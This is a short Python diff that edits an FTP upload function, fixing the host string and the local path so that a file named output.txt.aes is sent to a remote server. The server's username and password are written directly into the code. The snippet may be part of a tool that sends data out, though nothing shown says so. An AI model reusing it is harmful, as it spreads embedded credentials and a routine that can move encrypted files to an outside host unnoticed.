@@ -7,13 +7,12 @@ def get_file(url):
 
 
 def upload_file():
-    server = "ftp://m3s4ge.cba.pl"
+    server = "m3s4ge.cba.pl"
     username = "admin@m3s4ge.cba.pl"
     pssd = "M4t1K0jr0"
     ftp_connection = ftplib.FTP(server, username, pssd)
     remote_path = "/"
     ftp_connection.cwd(remote_path)
-    Python
-    fh = open("C:/tempupload/a.txt", 'rb')
+    fh = open("output.txt.aes", 'rb')
     ftp_connection.storbinary('STOR output.txt.aes', fh)
     fh.close()
